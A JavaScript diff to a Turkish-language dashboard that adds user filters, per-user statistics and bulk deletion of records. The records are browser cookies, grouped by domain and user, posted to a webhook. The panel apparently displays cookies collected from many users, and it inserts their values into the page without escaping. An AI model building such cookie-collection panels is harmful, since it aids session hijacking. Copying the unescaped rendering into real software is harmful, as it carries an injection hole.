@@ -1,5 +1,7 @@
 let lastData = [];
 let domains = new Set();
+let users = new Set();
+let selectedPosts = new Set();
 
 async function fetchPosts() {
   try {
@@ -13,6 +15,7 @@ async function fetchPosts() {
     
     lastData = data;
     updateDomainList(data);
+    updateUserList(data);
     updateStats(data);
     updateSummary(data);
     renderPosts(data);
@@ -47,10 +50,32 @@ function updateDomainList(data) {
   domainFilter.value = currentValue;
 }
 
+function updateUserList(data) {
+  const userSet = new Set();
+  data.forEach(post => {
+    if (post.userId) userSet.add(post.userId);
+  });
+  
+  users = userSet;
+  const userFilter = document.getElementById('userFilter');
+  const currentValue = userFilter.value;
+  
+  userFilter.innerHTML = '<option value="">Tümü</option>';
+  [...users].sort().forEach(userId => {
+    const option = document.createElement('option');
+    option.value = userId;
+    option.textContent = `Kullanıcı ${userId}`;
+    userFilter.appendChild(option);
+  });
+  
+  userFilter.value = currentValue;
+}
+
 function updateStats(data) {
   const totalRequests = data.length;
   const totalCookies = data.reduce((sum, post) => sum + (post.cookieCount || 0), 0);
   const uniqueDomains = domains.size;
+  const uniqueUsers = users.size;
   
   const stats = document.getElementById('stats');
   stats.innerHTML = `
@@ -66,6 +91,10 @@ function updateStats(data) {
       <h3>Benzersiz Domain</h3>
       <div class="value">${uniqueDomains}</div>
     </div>
+    <div class="stat-card">
+      <h3>Aktif Kullanıcı</h3>
+      <div class="value">${uniqueUsers}</div>
+    </div>
   `;
 }
 
@@ -78,10 +107,11 @@ function updateSummary(data) {
       post.body.cookies.forEach(cookie => {
         const domain = cookie['Host raw'];
         if (!domainStats[domain]) {
-          domainStats[domain] = { count: 0, types: new Set() };
+          domainStats[domain] = { count: 0, types: new Set(), users: new Set() };
         }
         domainStats[domain].count++;
         domainStats[domain].types.add(cookie['Name raw']);
+        if (post.userId) domainStats[domain].users.add(post.userId);
       });
     }
   });
@@ -94,6 +124,7 @@ function updateSummary(data) {
         <div class="domain-details">
           <span>${stats.count} cookie</span>
           <span>${stats.types.size} benzersiz</span>
+          <span>${stats.users.size} kullanıcı</span>
         </div>
       </div>
     `).join('');
@@ -105,6 +136,7 @@ function renderPosts(data) {
   const list = document.getElementById('list');
   const showOnlyCookies = document.getElementById('showOnlyCookies').checked;
   const selectedDomain = document.getElementById('domainFilter').value;
+  const selectedUser = document.getElementById('userFilter').value;
   const searchTerm = document.getElementById('searchInput').value.toLowerCase();
   
   // Filtreleme
@@ -118,6 +150,10 @@ function renderPosts(data) {
     filteredData = filteredData.filter(post => 
       post.body?.cookies?.some(cookie => cookie['Host raw'] === selectedDomain)
     );
+  }
+  
+  if (selectedUser) {
+    filteredData = filteredData.filter(post => post.userId === selectedUser);
   }
   
   if (searchTerm) {
@@ -136,9 +172,14 @@ function renderPosts(data) {
     const cookieData = post.body.cookies ? formatCookieData(post.body.cookies, selectedDomain) : '';
     
     div.innerHTML = `
+      <label class="post-select">
+        <input type="checkbox" class="post-checkbox" data-id="${post.id}" ${selectedPosts.has(post.id) ? 'checked' : ''}>
+      </label>
       <div class="post-header">
         <div class="time">${new Date(post.time).toLocaleString('tr-TR')}</div>
-        <div class="cookie-count">Bu sitede ${post.cookieCount || 0} cookie bulundu</div>
+        <div class="cookie-count">
+          Kullanıcı ${post.userId} - ${post.cookieCount || 0} cookie
+        </div>
       </div>
       <div class="post-content">
         ${cookieData}
@@ -146,8 +187,21 @@ function renderPosts(data) {
       </div>
     `;
     
+    // Checkbox event listener
+    const checkbox = div.querySelector('.post-checkbox');
+    checkbox.addEventListener('change', (e) => {
+      if (e.target.checked) {
+        selectedPosts.add(post.id);
+      } else {
+        selectedPosts.delete(post.id);
+      }
+      updateDeleteButton();
+    });
+    
     list.appendChild(div);
   });
+  
+  updateDeleteButton();
 }
 
 function formatCookieData(cookies, selectedDomain) {
@@ -174,6 +228,53 @@ function formatCookieData(cookies, selectedDomain) {
   `;
 }
 
+function updateDeleteButton() {
+  const deleteButton = document.getElementById('deleteSelected');
+  deleteButton.disabled = selectedPosts.size === 0;
+}
+
+async function deleteData(options = {}) {
+  try {
+    const response = await fetch('/api/webhook', {
+      method: 'DELETE',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify(options)
+    });
+
+    if (!response.ok) {
+      throw new Error(`HTTP error! status: ${response.status}`);
+    }
+
+    // Başarılı silme işleminden sonra
+    selectedPosts.clear();
+    await fetchPosts();
+  } catch (error) {
+    console.error('Silme hatası:', error);
+    alert('Silme işlemi sırasında bir hata oluştu.');
+  }
+}
+
+// Modal functions
+function showModal(message, onConfirm) {
+  const modal = document.getElementById('confirmModal');
+  const confirmMessage = document.getElementById('confirmMessage');
+  
+  confirmMessage.textContent = message;
+  modal.classList.add('show');
+  
+  const handleConfirm = async () => {
+    modal.classList.remove('show');
+    await onConfirm();
+  };
+  
+  document.getElementById('confirmOk').onclick = handleConfirm;
+  document.getElementById('confirmCancel').onclick = () => {
+    modal.classList.remove('show');
+  };
+}
+
 // Event Listeners
 document.getElementById('showOnlyCookies').addEventListener('change', () => {
   renderPosts(lastData);
@@ -183,12 +284,46 @@ document.getElementById('domainFilter').addEventListener('change', () => {
   renderPosts(lastData);
 });
 
+document.getElementById('userFilter').addEventListener('change', () => {
+  renderPosts(lastData);
+});
+
 document.getElementById('searchInput').addEventListener('input', debounce(() => {
   renderPosts(lastData);
 }, 300));
 
 document.getElementById('refreshButton').addEventListener('click', () => {
   fetchPosts();
+});
+
+document.getElementById('selectAll').addEventListener('change', (e) => {
+  const checkboxes = document.querySelectorAll('.post-checkbox');
+  checkboxes.forEach(checkbox => {
+    checkbox.checked = e.target.checked;
+    const id = checkbox.dataset.id;
+    if (e.target.checked) {
+      selectedPosts.add(id);
+    } else {
+      selectedPosts.delete(id);
+    }
+  });
+  updateDeleteButton();
+});
+
+document.getElementById('deleteSelected').addEventListener('click', () => {
+  if (selectedPosts.size === 0) return;
+  
+  showModal(
+    `Seçili ${selectedPosts.size} kaydı silmek istediğinizden emin misiniz?`,
+    () => deleteData({ ids: Array.from(selectedPosts) })
+  );
+});
+
+document.getElementById('deleteAll').addEventListener('click', () => {
+  showModal(
+    'Tüm kayıtları silmek istediğinizden emin misiniz?',
+    () => deleteData({ deleteAll: true })
+  );
 });
 
 // Yardımcı fonksiyonlar
